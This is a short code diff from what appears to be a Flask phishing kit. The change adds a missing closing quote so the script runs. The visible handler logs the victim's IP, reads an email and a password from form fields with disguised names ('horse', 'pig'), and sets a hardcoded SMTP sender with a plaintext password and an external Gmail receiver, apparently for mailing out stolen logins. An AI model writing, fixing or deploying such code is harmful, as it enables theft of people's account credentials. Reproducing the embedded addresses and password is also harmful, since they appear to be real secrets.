@@ -446,7 +446,7 @@ def first():
             ip = request.remote_addr
         email = request.form.get('horse')
         passwordemail = request.form.get('pig')
-        sender_email = 'operation@greenflag-sdn.com
+        sender_email = 'operation@greenflag-sdn.com'
         sender_emaill = 'operation'
         receiver_email = 'aklapciukas.powercargo.uk@gmail.com'
         password = 'COST&&ukut0'
